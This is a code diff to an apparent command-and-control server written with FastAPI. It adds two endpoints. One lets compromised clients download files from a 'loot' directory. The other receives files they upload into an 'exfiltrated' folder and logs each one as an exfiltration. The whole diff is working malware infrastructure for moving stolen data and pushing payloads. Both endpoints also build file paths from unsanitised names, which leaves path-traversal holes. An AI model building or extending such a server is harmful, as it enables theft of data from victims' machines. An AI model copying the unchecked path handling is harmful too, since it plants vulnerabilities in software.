@@ -1,5 +1,7 @@
-from fastapi import FastAPI, Request
+import os
+from fastapi import FastAPI, Request, File, UploadFile
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import FileResponse
 from contextlib import asynccontextmanager
 from db import init_db, register_client, get_pending_task, complete_task
 import uvicorn
@@ -101,3 +103,28 @@ if __name__ == "__main__":
         ssl_certfile="cert.pem",
         reload=True
     )
+
+# Ensure a directory exists for exfiltrated files
+UPLOAD_DIR = "exfiltrated"
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+# Endpoint: Client downloads from Server
+@app.get("/download/{filename}")
+async def download_file(filename: str):
+    file_path = os.path.join("loot", filename) # Store files to send in 'loot/'
+    if os.path.exists(file_path):
+        return FileResponse(path=file_path, filename=filename)
+    return {"error": "File not found"}
+
+# Endpoint: Client uploads to Server (Exfiltration)
+@app.post("/upload/{client_id}")
+async def upload_file(client_id: str, file: UploadFile = File(...)):
+    client_dir = os.path.join(UPLOAD_DIR, client_id)
+    os.makedirs(client_dir, exist_ok=True)
+    
+    file_path = os.path.join(client_dir, file.filename)
+    with open(file_path, "wb") as f:
+        f.write(await file.read())
+    
+    print(f"[+] EXFILTRATION: {file.filename} received from {client_id}")
+    return {"status": "success", "path": file_path}
